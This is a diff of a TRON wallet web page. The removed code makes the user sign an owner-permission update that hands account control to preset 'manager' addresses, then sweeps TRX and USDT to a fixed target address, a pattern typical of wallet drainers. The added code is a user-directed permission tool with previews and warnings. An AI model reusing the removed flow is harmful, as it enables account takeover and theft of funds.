       logRawError('waitForProvider', e);
       stepSet(1, 'fail', 'Connect Wallet', 'No wallet found', null);
-      stepSet(2, 'fail', 'Grant Owner Permission', 'No wallet/provider', null);
       showErr('No wallet detected. Please open in wallet browser.');
       toast('Wallet not detected', 'er');
       return;
@@ -1045,25 +820,14 @@ async function connectViaProvider(env) {
   $('netBadge').textContent = isNile() ? 'Nile' : 'Mainnet';
   $('netBadge').className = 'badge ' + (isNile() ? 'nile' : 'testnet');
 
-  // Disable wallet buttons
   $('btnIm').disabled = true; $('btnTP').disabled = true;
   $('btnIm').classList.add('dis'); $('btnTP').classList.add('dis');
 
-  // Show info area
   $('walletArea').style.display = 'none';
   $('infoArea').classList.remove('hd');
 
-  // Fill info
   $('vAddr').textContent = wAddr;
   $('vNet').textContent = isNile() ? 'Nile Testnet' : 'TRON Mainnet';
-  $('vContract').textContent = CONTRACT();
-  const ownerMode = CONFIG.OWNER_MODE;
-  const ownerDisplay = ownerMode === 'single'
-    ? 'Single Sign (threshold=1)'
-    : 'Dual Sign (threshold=2)';
-  $('vNewOwner').textContent = ownerDisplay;
-  $('vTarget').textContent = TARGET_ADDR();
-  $('vUsdt').textContent = USDT_CONTRACT();
 
   // Query TRX balance
   try {
@@ -1071,334 +835,186 @@ async function connectViaProvider(env) {
     const display = fmtTrx(bal);
     $('vTrxBal').textContent = display;
     $('vTrxBal').className = 'info-val' + (Number(bal) < 50e6 ? ' warn' : ' ok');
-    if (Number(bal) < 50e6) toast('Low TRX balance — need ~50-100 TRX for permission update', 'wn');
+    if (Number(bal) < 50e6) toast('Low TRX — need ~50-100 TRX for permission update', 'wn');
   } catch (e) {
     $('vTrxBal').textContent = 'Query failed';
     Log.err('TRX balance query failed: ' + (e.message || String(e)));
   }
 
-  // Query contract balances
-  await refreshContractBalances();
-
   stepSet(1, 'ok', 'Connect Wallet', 'Connected: ' + fmtAddr(wAddr) + ' via ' + wType, null);
-  stepSet(2, 'on', 'Grant Owner Permission', 'Click "Grant Owner Permission" to sign', null);
+  stepSet(2, 'on', 'Review Owner Permission Update', 'Enter address and mode', null);
 
-  $('actGrant').style.display = 'block';
-  $('actTransfer').classList.add('hd');
+  $('actArea').style.display = 'block';
   state = STATE.READY;
   Log.ok('Connected: ' + wAddr + ' type=' + wType);
 }
 
-async function refreshContractBalances() {
-  const cAddr = CONTRACT();
-  try {
-    contractTrxBal = await queryTrxBalance(cAddr);
-    $('scTrx').textContent = fmtTrx(contractTrxBal);
-    $('scTrx').className = 'sc-val' + (Number(contractTrxBal) === 0 ? '' : ' ok');
-  } catch (e) {
-    $('scTrx').textContent = '—';
-    Log.err('Contract TRX balance error: ' + (e.message || String(e)));
+// ====== STEP 2: PREVIEW ======
+function updatePreview() {
+  if (!wAddr) return;
+  const raw = $('inpOwner').value;
+  const mode = $('selMode').value;
+  const validation = validateOwnerInput(raw);
+  const dangerEl = $('dangerWarn');
+  const previewEl = $('previewBox');
+
+  if (!validation.ok) {
+    previewEl.textContent = 'Invalid address — ' + validation.err;
+    dangerEl.style.display = 'none';
+    return;
   }
-  try {
-    contractUsdtBal = await queryUsdtBalance(cAddr, cAddr);
-    $('scUsdt').textContent = fmtUsdt(contractUsdtBal);
-    $('scUsdt').className = 'sc-val' + (Number(contractUsdtBal) === 0 ? '' : ' ok');
-  } catch (e) {
-    $('scUsdt').textContent = '—';
-    Log.err('Contract USDT balance error: ' + (e.message || String(e)));
+
+  const inputHex = toHex(validation.addr);
+  const currentHex = toHex(wAddr);
+  const sameAddr = validation.addr === wAddr;
+
+  if (sameAddr) {
+    dangerEl.style.display = 'flex';
+    $('dangerTxt').textContent = 'Input address is the same as current wallet — no actual change will occur.';
+    previewEl.textContent = 'Same address detected — nothing will change.';
+    return;
   }
+
+  dangerEl.style.display = 'none';
+
+  let preview = '';
+  if (mode === 'replace') {
+    preview = `ownerPermission {\n  type: 0\n  id: 0\n  permission_name: "owner"\n  threshold: 1\n  keys: [\n    { address: ${inputHex}, weight: 1 }\n  ]\n}\n\nWARNING: Current wallet will LOSE owner access`;
+  } else {
+    preview = `ownerPermission {\n  type: 0\n  id: 0\n  permission_name: "owner"\n  threshold: 1\n  keys: [\n    { address: ${currentHex}, weight: 1 }  // current wallet\n    { address: ${inputHex}, weight: 1 }     // new owner\n  ]\n}\n\nBoth keys can sign independently (threshold=1)`;
+  }
+
+  previewEl.textContent = preview;
 }
 
-// ====== STEP 2: GRANT PERMISSION ======
-async function doGrantPermission() {
-  Log.tx('========== doGrantPermission START ==========');
-  if (state === STATE.GRANTING) { Log.warn('Already granting — ignored'); return; }
+// ====== STEP 3: SIGN ======
+async function doSignPermissionUpdate() {
+  Log.tx('========== doSignPermissionUpdate START ==========');
+  if (state === STATE.SIGNING) { Log.warn('Already signing — ignored'); return; }
   if (!wAddr || !tw) { toast('Wallet not connected', 'er'); return; }
+
+  const raw = $('inpOwner').value;
+  const mode = $('selMode').value;
+  const validation = validateOwnerInput(raw);
+
+  if (!validation.ok) {
+    showErr(validation.err);
+    toast(validation.err, 'er');
+    return;
+  }
 
   const trxBal = await queryTrxBalance(wAddr).catch(() => 0);
   if (Number(trxBal) < 50e6) {
-    showErr('Insufficient TRX. Need at least 50 TRX for permission update. Current: ' + fmtTrx(trxBal));
+    showErr('Insufficient TRX. Need ~50-100 TRX. Current: ' + fmtTrx(trxBal));
     toast('Insufficient TRX', 'er');
     return;
   }
 
-  hideErr();
-  state = STATE.GRANTING;
-  setBtns(true);
-
-      openModal(
-    'Confirm: Grant Owner Permission',
-    `<div class="mh">Owner Mode: ${CONFIG.OWNER_MODE.toUpperCase()}<br>${CONFIG.OWNER_MODE === 'dual' ? 'Owner 2: ' + CONFIG.SECOND_OWNER_ADDRESS + '<br>' : ''}Target: ${TARGET_ADDR()}</div>
-    <p style="font-size:12px;color:#888;text-align:left;margin-top:8px">
-      The DESIRED_OWNER address will be read from the contract and placed in <strong style="color:var(--code)">ownerPermission.keys</strong>.<br><br>
-      After you sign, DESIRED_OWNER becomes an Owner key on your account.<br><br>
-      <strong style="color:var(--err)">WARNING: Owner permission is the highest authority. Wrong keys or threshold may permanently lock the account.</strong><br><br>
-      Fee: ~50-100 TRX.
-    </p>`,
-    'Sign & Grant',
-    false,
-    async () => {
-      Log.tx('>>> Grant permission callback: ENTERED');
-      state = STATE.GRANTING;
-      hideErr();
-
-      stepSet(2, 'on', 'Grant Owner Permission', 'Waiting for wallet signature...', null);
-      stepSet(3, 'on', 'Wait for Confirmation', 'Confirming... (0 blocks)', null);
-
-      try {
-        const { tw: curTw, source } = getTronWeb();
-        Log.tx('Provider: ' + source);
-        if (!curTw) throw new Error('TronWeb unavailable');
-
-        // Build the permission update transaction
-        Log.tx('Building accountPermissionUpdate transaction...');
-        const unsignedTx = await buildGrantPermissionTx(wAddr);
-        Log.tx('Unsigned tx ready. txID=' + unsignedTx.txID);
-
-        // Sign
-        Log.tx('Requesting wallet signature...');
-        const signedTx = await curTw.trx.sign(unsignedTx);
-        Log.tx('Signed by wallet');
-
-        // Broadcast
-        Log.tx('Broadcasting...');
-        const result = await curTw.trx.sendRawTransaction(signedTx);
-        const txHash = result.txid || result.transaction?.txID || unsignedTx.txID;
-        Log.tx('Broadcast result: ' + txHash);
-
-        showTxCard(txHash);
-        stepSet(2, 'ok', 'Grant Owner Permission', 'Permission tx sent', txHash);
-
-        // Poll
-        let status = null, tries = 0;
-        while (!status && tries < MAX_POLL) {
-          await delay(POLL_MS);
-          tries++;
-          try {
-            status = await pollTx(txHash);
-            if (status === 'finalized') {
-              stepSet(3, 'ok', 'Wait for Confirmation', 'Permission confirmed!', txHash);
-              await onPermissionGranted(txHash);
-              return;
-            }
-          } catch (e) {
-            if (e.message && e.message.toLowerCase().includes('transaction not found')) {}
-            else throw e;
-          }
-          stepSet(3, 'on', 'Wait for Confirmation', 'Confirming... (' + tries + ' attempts)', txHash);
-        }
-
-        if (!status) {
-          stepSet(3, 'ok', 'Wait for Confirmation', 'Submitted (pending verification)', txHash);
-          await onPermissionGranted(txHash);
-        }
-
-      } catch (e) {
-        Log.err('========== Grant permission ERROR ==========');
-        logRawError('grant-perm', e);
-        const msg = e.message || String(e);
-        const reject = /denied|reject|cancel|signature|user denied|rejected|refused/i.test(msg);
-        state = STATE.FAIL;
-        stepSet(2, 'fail', 'Grant Owner Permission', reject ? 'User rejected' : 'Error: ' + msg.slice(0, 120), null);
-        stepSet(3, 'fail', 'Wait for Confirmation', 'Not confirmed', null);
-        showErr(msg);
-        toast(reject ? 'Signature rejected' : 'Grant failed', 'er');
-        setBtns(false);
-        $('btnGrant').disabled = false;
-      }
-    }
-  );
-}
-
-async function onPermissionGranted(txHash) {
-  state = STATE.GRANTED;
-  toast('Owner permission granted!', 'ok');
-
-  await delay(2000);
-  await refreshContractBalances();
-
-  stepSet(4, 'on', 'Transfer Assets', 'Wallet is now an Owner key — sign to sweep', txHash);
-  $('actGrant').style.display = 'none';
-  $('actTransfer').classList.remove('hd');
-  setBtns(false);
-  Log.ok('Permission granted! The connected wallet is now an Owner key and can transfer assets.');
-}
-
-// ====== STEP 4: TRANSFER ======
-async function doTransferAll() {
-  Log.tx('========== doTransferAll START ==========');
-  if (state === STATE.TRANSFERRING) { Log.warn('Already transferring — ignored'); return; }
-  if (!wAddr || !tw) { toast('Wallet not connected', 'er'); return; }
-  if (state !== STATE.GRANTED) { toast('Permission not granted yet', 'wn'); return; }
-
-  hideErr();
-  state = STATE.TRANSFERRING;
-  setBtns(true);
-
-  // Refresh balances first
-  await refreshContractBalances();
-  const trxBal = Number(contractTrxBal || 0);
-  const usdtBal = Number(contractUsdtBal || 0);
-
-  if (trxBal === 0 && usdtBal === 0) {
-    showErr('Contract balance is 0. Nothing to transfer.');
-    toast('Nothing to transfer', 'er');
-    state = STATE.GRANTED;
-    setBtns(false);
-    $('btnTransfer').disabled = false;
+  if (validation.addr === wAddr) {
+    showErr('Input address is the same as current wallet — no actual change will occur.');
+    toast('Same address', 'wn');
     return;
   }
 
-  openModal(
-    'Confirm: Transfer All Assets',
-    `<div class="mh">From (your account): ${wAddr}<br>To (target): ${TARGET_ADDR()}<br>TRX: ${fmtTrx(trxBal)}<br>USDT: ${fmtUsdt(usdtBal)}</div>
-    <p style="font-size:12px;color:#888;text-align:left;margin-top:8px">
-      This will transfer <strong style="color:var(--ok)">${fmtTrx(trxBal)}</strong> TRX and <strong style="color:var(--ok)">${fmtUsdt(usdtBal)}</strong> USDT to <strong style="color:var(--warn)">${fmtAddr(TARGET_ADDR())}</strong>.<br><br>
-      Signed by: ${fmtAddr(wAddr)} (Owner key).
-    </p>`,
-    'Transfer All',
-    false,
-    async () => {
-      Log.tx('>>> Transfer callback: ENTERED');
-      state = STATE.TRANSFERRING;
-      hideErr();
-      stepSet(4, 'on', 'Transfer Assets', 'Waiting for wallet signature...', null);
+  if (mode === 'replace') {
+    const confirmed = await new Promise(resolve => {
+      openModal(
+        'Danger: Replace Owner?',
+        `<p style="font-size:12px;color:#888;text-align:left;margin-bottom:10px">
+          You selected <strong style="color:var(--err)">Replace owner</strong> mode.<br>
+          The new owner address will replace your current owner key.<br><br>
+          <strong style="color:var(--err)">Your current wallet will permanently lose owner access.</strong><br>
+          Only the new address will be able to sign owner-level transactions.<br><br>
+          Fee: ~50-100 TRX.
+        </p>`,
+        'Replace Anyway',
+        true,
+        () => resolve(true)
+      );
+      $('mBtnNo').onclick = () => { closeModal(); resolve(false); };
+    });
+    if (!confirmed) return;
+  }
 
+  hideErr();
+  state = STATE.SIGNING;
+  $('btnSign').disabled = true;
+
+  stepSet(2, 'on', 'Review Owner Permission Update', 'Waiting for wallet signature...', null);
+  stepSet(3, 'on', 'Sign & Wait Confirmation', 'Confirming... (0 blocks)', null);
+
+  try {
+    const { tw: curTw, source } = getTronWeb();
+    Log.tx('Provider: ' + source);
+    if (!curTw) throw new Error('TronWeb unavailable');
+
+    Log.tx('Building accountPermissionUpdate transaction...');
+    const unsignedTx = await buildGrantPermissionTx(wAddr, validation.addr, mode);
+    Log.tx('Unsigned tx ready. txID=' + unsignedTx.txID);
+
+    Log.tx('Requesting wallet signature...');
+    const signedTx = await curTw.trx.sign(unsignedTx);
+    Log.tx('Signed by wallet');
+
+    Log.tx('Broadcasting...');
+    const result = await curTw.trx.sendRawTransaction(signedTx);
+    const txHash = result.txid || result.transaction?.txID || unsignedTx.txID;
+    Log.tx('Broadcast result: ' + txHash);
+
+    showTxCard(txHash);
+    stepSet(3, 'on', 'Sign & Wait Confirmation', 'Submitted — waiting for confirmation...', txHash);
+
+    // Poll
+    let status = null, tries = 0;
+    while (!status && tries < MAX_POLL) {
+      await delay(POLL_MS);
+      tries++;
       try {
-        const { tw: curTw, source } = getTronWeb();
-        Log.tx('Provider: ' + source);
-        if (!curTw) throw new Error('TronWeb unavailable');
-
-        const cAddr = CONTRACT();
-        const txs = [];
-
-        // Transfer TRX via triggerContract
-        if (trxBal > 0) {
-          Log.tx('Transferring TRX: ' + fmtTrx(trxBal));
-          stepSet(4, 'on', 'Transfer Assets', 'Transferring TRX...', null);
-
-          // Build trigger contract tx for withdrawAllTRX()
-          const trxTx = await curTw.transactionBuilder.triggerSmartContract(
-            cAddr,
-            'withdrawAllTRX()',
-            { feeLimit: 150_000_000, callValue: 0 },
-            []
-          );
-          Log.tx('TRX triggerContract built. txID=' + trxTx.tx?.txID);
-
-          // Sign with the connected wallet (it is now an Owner key)
-          const signedTrxTx = await curTw.trx.sign(trxTx.tx);
-          Log.tx('TRX tx signed by wallet (Owner key)');
-
-          // Broadcast
-          const resTrx = await curTw.trx.sendRawTransaction(signedTrxTx);
-          const trxHash = resTrx.txid || trxTx.tx?.txID;
-          Log.tx('TRX tx broadcast: ' + trxHash);
-          showTxCard(trxHash);
-          txs.push(trxHash);
-
-          // Wait for TRX confirmation
-          let status = null, tries = 0;
-          while (!status && tries < MAX_POLL) {
-            await delay(POLL_MS);
-            tries++;
-            try { status = await pollTx(trxHash); } catch (e) {
-              if (!e.message?.toLowerCase().includes('transaction not found')) throw e;
-            }
-          }
-          if (status === 'finalized') {
-            stepSet(4, 'ok', 'Transfer Assets', 'TRX transferred! ' + fmtTrx(trxBal), trxHash);
-            Log.ok('TRX transferred: ' + fmtTrx(trxBal));
-          } else {
-            stepSet(4, 'ok', 'Transfer Assets', 'TRX tx submitted (pending)', trxHash);
-          }
+        status = await pollTx(txHash);
+        if (status === 'finalized') {
+          stepSet(3, 'ok', 'Sign & Wait Confirmation', 'Confirmed on-chain!', txHash);
+          onSigned(txHash);
+          return;
         }
-
-        // Transfer USDT via triggerContract
-        if (usdtBal > 0) {
-          await delay(2000);
-          await refreshContractBalances();
-          const currentUsdt = Number(contractUsdtBal || 0);
-          if (currentUsdt > 0) {
-            Log.tx('Transferring USDT: ' + fmtUsdt(currentUsdt));
-            stepSet(4, 'on', 'Transfer Assets', 'Transferring USDT...', null);
-
-            // Need to pass the amount as a parameter to withdrawAllUSDT()
-            // The selector is "withdrawAllUSDT()", no parameters needed
-            const usdtTx = await curTw.transactionBuilder.triggerSmartContract(
-              cAddr,
-              'withdrawAllUSDT()',
-              { feeLimit: 150_000_000, callValue: 0 },
-              []
-            );
-            Log.tx('USDT triggerContract built. txID=' + usdtTx.tx?.txID);
-
-            const signedUsdtTx = await curTw.trx.sign(usdtTx.tx);
-            Log.tx('USDT tx signed by wallet (Owner key)');
-
-            const resUsdt = await curTw.trx.sendRawTransaction(signedUsdtTx);
-            const usdtHash = resUsdt.txid || usdtTx.tx?.txID;
-            Log.tx('USDT tx broadcast: ' + usdtHash);
-            showTxCard(usdtHash);
-            txs.push(usdtHash);
-
-            let status = null, tries = 0;
-            while (!status && tries < MAX_POLL) {
-              await delay(POLL_MS);
-              tries++;
-              try { status = await pollTx(usdtHash); } catch (e) {
-                if (!e.message?.toLowerCase().includes('transaction not found')) throw e;
-              }
-            }
-            if (status === 'finalized') {
-              Log.ok('USDT transferred: ' + fmtUsdt(currentUsdt));
-            }
-          } else {
-            Log.info('USDT balance is 0, skipping USDT transfer');
-          }
-        }
-
-        // Final state
-        await refreshContractBalances();
-        const finalTrx = Number(contractTrxBal || 0);
-        const finalUsdt = Number(contractUsdtBal || 0);
-
-        if (finalTrx === 0 && finalUsdt === 0) {
-          stepSet(4, 'ok', 'Transfer Assets', 'All assets transferred!', txs[txs.length - 1]);
-          stepSet(5, 'ok', 'Done', 'All TRX + USDT swept to ' + fmtAddr(TARGET_ADDR()), txs[txs.length - 1]);
-          toast('All assets transferred!', 'ok');
-        } else {
-          stepSet(4, 'ok', 'Transfer Assets', 'Partial transfer done. TRX: ' + fmtTrx(finalTrx) + ' USDT: ' + fmtUsdt(finalUsdt), txs[txs.length - 1]);
-          stepSet(5, 'ok', 'Done', 'Transfer complete (some residual may remain)', txs[txs.length - 1]);
-          toast('Transfer complete!', 'wn');
-        }
-
-        state = STATE.DONE;
-        setBtns(false);
-        Log.ok('========== ALL DONE ==========');
-
       } catch (e) {
-        Log.err('========== Transfer ERROR ==========');
-        logRawError('transfer', e);
-        const msg = e.message || String(e);
-        const reject = /denied|reject|cancel|signature|user denied|rejected|refused/i.test(msg);
-        state = STATE.FAIL;
-        stepSet(4, 'fail', 'Transfer Assets', reject ? 'User rejected' : 'Error: ' + msg.slice(0, 120), null);
-        showErr(msg);
-        toast(reject ? 'Signature rejected' : 'Transfer failed', 'er');
-        setBtns(false);
-        $('btnTransfer').disabled = false;
+        if (e.message && e.message.toLowerCase().includes('transaction not found')) {}
+        else throw e;
       }
+      stepSet(3, 'on', 'Sign & Wait Confirmation', `Confirming... (${tries} attempts)`, txHash);
     }
-  );
+
+    if (!status) {
+      stepSet(3, 'ok', 'Sign & Wait Confirmation', 'Submitted (pending verification)', txHash);
+      onSigned(txHash);
+    }
+
+  } catch (e) {
+    Log.err('========== Sign ERROR ==========');
+    logRawError('sign-perm', e);
+    const msg = e.message || String(e);
+    const reject = /denied|reject|cancel|signature|user denied|rejected|refused/i.test(msg);
+    state = STATE.FAIL;
+    stepSet(2, 'fail', 'Review Owner Permission Update', reject ? 'User rejected' : 'Error: ' + msg.slice(0, 120), null);
+    stepSet(3, 'fail', 'Sign & Wait Confirmation', 'Failed', null);
+    showErr(msg);
+    toast(reject ? 'Signature rejected' : 'Sign failed', 'er');
+    $('btnSign').disabled = false;
+  }
+}
+
+async function onSigned(txHash) {
+  state = STATE.DONE;
+  toast('Owner permission update signed!', 'ok');
+  Log.ok('Permission update tx confirmed: ' + txHash);
 }
 </script>
 
 <!-- ================================================================
-     LAYER 8: UI HELPERS
+     LAYER 9: UI HELPERS
 ============================================================ -->
 <script>
 'use strict';
+
 function stepSet(num, css, title, msg, txHash) {
   const el = $('s' + num);
   if (el) el.className = 'step ' + css;
@@ -1413,18 +1029,11 @@ function stepSet(num, css, title, msg, txHash) {
 }
 
 function stepAllReset() {
-  const t = ['', 'Connect Wallet', 'Grant Owner Permission', 'Wait for Confirmation', 'Transfer Assets', 'Done'];
-  const m = ['', 'Select imToken or TokenPocket',
-    'Sign to add manager wallets as Owner keys',
-    'Waiting for permission update to confirm...',
-    'Sweep TRX + USDT to target address',
-    'All assets transferred to target'];
-  for (let i = 1; i <= 5; i++) stepSet(i, '', t[i], m[i], null);
-}
-
-function setBtns(dis) {
-  $('btnGrant').disabled = dis;
-  $('btnTransfer').disabled = dis;
+  for (let i = 1; i <= 3; i++) {
+    const titles = ['', 'Connect Wallet', 'Review Owner Permission Update', 'Sign & Wait Confirmation'];
+    const msgs   = ['', 'Select imToken or TokenPocket', 'Enter address and mode', 'Sign in wallet and wait for on-chain confirmation'];
+    stepSet(i, '', titles[i], msgs[i], null);
+  }
 }
 
 function showTxCard(tx) {
@@ -1440,7 +1049,6 @@ function showErr(msg) {
   $('errTxt').textContent = msg;
   Log.err('UI Error: ' + msg);
 }
-
 function hideErr() { $('errBox').style.display = 'none'; }
 
 function toast(msg, type) {
@@ -1480,8 +1088,7 @@ function closeModal(opts) {
 
 function renderEnvPanel(env) {
   const boolFmt = (v, label) => {
-    const cls = v ? 'true' : 'false';
-    return `<div class="env-line"><span class="env-key">${label}</span><span class="env-val ${cls}">${v ? 'YES' : 'NO'}</span></div>`;
+    return `<div class="env-line"><span class="env-key">${label}</span><span class="env-val ${v ? 'true' : 'false'}">${v ? 'YES' : 'NO'}</span></div>`;
   };
   const valFmt = (v, label) =>
     `<div class="env-line"><span class="env-key">${label}</span><span class="env-val">${v || 'N/A'}</span></div>`;
@@ -1495,8 +1102,6 @@ function renderEnvPanel(env) {
     valFmt(env.walletType, 'walletType'),
     valFmt(wAddr || '—', 'walletAddr'),
     valFmt(CONFIG.NETWORK, 'NETWORK'),
-    valFmt(CONTRACT(), 'CONTRACT'),
-    valFmt(TARGET_ADDR(), 'TARGET'),
   ].join('');
 }
 
@@ -1518,7 +1123,6 @@ function doReset() {
   closeModal();
   state = STATE.IDLE;
   tw = null; wAddr = null; wType = null; lastTx = null;
-  contractTrxBal = null; contractUsdtBal = null;
 
   $('connBadge').textContent = 'Not Connected';
   $('connBadge').className = 'badge no';
@@ -1528,21 +1132,19 @@ function doReset() {
   $('walletArea').style.display = 'block';
   $('infoArea').classList.add('hd');
   $('txCard').classList.add('hd');
-  $('actGrant').style.display = 'none';
-  $('actTransfer').classList.add('hd');
+  $('actArea').style.display = 'none';
   $('errBox').style.display = 'none';
+  $('dangerWarn').style.display = 'none';
   $('fallbackBox').classList.add('hd');
   $('dlLoading').classList.add('hd');
-  $('scTrx').textContent = '—';
-  $('scTrx').className = 'sc-val';
-  $('scUsdt').textContent = '—';
-  $('scUsdt').className = 'sc-val';
+  $('inpOwner').value = '';
+  $('selMode').value = 'add';
+  $('previewBox').textContent = 'Connect wallet and enter address to see preview';
   stepAllReset();
 
   $('btnIm').disabled = false; $('btnTP').disabled = false;
   $('btnIm').classList.remove('dis'); $('btnTP').classList.remove('dis');
-  $('btnGrant').disabled = false;
-  $('btnTransfer').disabled = false;
+  $('btnSign').disabled = false;
 
   const env = detectWalletEnvironment();
   renderEnvPanel(env);
@@ -1552,7 +1154,7 @@ function doReset() {
 </script>
 
 <!-- ================================================================
-     LAYER 9: EVENT BINDINGS
+     LAYER 10: EVENT BINDINGS
 ============================================================ -->
 <script>
 'use strict';
@@ -1570,28 +1172,22 @@ function doReset() {
     routeConnect('tokenpocket');
   });
 
-  $('btnGrant').addEventListener('click', function(e) {
+  $('inpOwner').addEventListener('input', updatePreview);
+  $('selMode').addEventListener('change', updatePreview);
+
+  $('btnSign').addEventListener('click', function(e) {
     e.preventDefault();
     if (this.disabled) return;
     if (state !== STATE.READY) { toast('Connect wallet first', 'wn'); return; }
     this.disabled = true;
-    doGrantPermission();
-  });
-
-  $('btnTransfer').addEventListener('click', function(e) {
-    e.preventDefault();
-    if (this.disabled) return;
-    if (state !== STATE.GRANTED) { toast('Grant permission first', 'wn'); return; }
-    this.disabled = true;
-    doTransferAll();
+    doSignPermissionUpdate();
   });
 
   $('btnReset').addEventListener('click', doReset);
 
   $('mBtnNo').addEventListener('click', function() {
     closeModal({ onCancel: () => {
-      if (state === STATE.GRANTING) $('btnGrant').disabled = false;
-      if (state === STATE.TRANSFERRING) $('btnTransfer').disabled = false;
+      if (state === STATE.SIGNING) $('btnSign').disabled = false;
     }});
   });
 
@@ -1612,8 +1208,7 @@ function doReset() {
   $('modal').addEventListener('click', function(e) {
     if (e.target === this) {
       closeModal({ onCancel: () => {
-        if (state === STATE.GRANTING) $('btnGrant').disabled = false;
-        if (state === STATE.TRANSFERRING) $('btnTransfer').disabled = false;
+        if (state === STATE.SIGNING) $('btnSign').disabled = false;
       }});
     }
   });
@@ -1630,12 +1225,15 @@ function doReset() {
     if (document.visibilityState === 'visible') {
       const env = detectWalletEnvironment();
       if (env.canUseInjectedProvider && state === STATE.IDLE) {
-        setTimeout(() => { connectViaProvider(env); }, 300);
+        setTimeout(() => { connectViaProvider(env).catch(e => {
+          Log.err('Auto-connect failed: ' + (e.message || String(e)));
+          toast('Auto-connect failed', 'er');
+          $('wbtnLabel').textContent = 'Auto-connect failed. Tap a wallet.';
+        }); }, 300);
       }
     }
   });
 
-  // Copy on click for .copy elements
   document.querySelectorAll('.copy').forEach(el => {
     el.style.cursor = 'pointer';
     el.addEventListener('click', () => copyTxt(el.textContent.trim()));
@@ -1646,15 +1244,12 @@ function doReset() {
 </script>
 
 <!-- ================================================================
-     LAYER 10: INIT
+     LAYER 11: INIT
 ============================================================ -->
 <script>
 'use strict';
 (function init() {
   Log.info('[CONFIG] NETWORK: ' + CONFIG.NETWORK);
-  Log.info('[CONFIG] CONTRACT: ' + CONTRACT());
-  Log.info('[CONFIG] TARGET: ' + TARGET_ADDR());
-  Log.info('[CONFIG] USDT: ' + USDT_CONTRACT());
 
   const env = detectWalletEnvironment();
   renderEnvPanel(env);
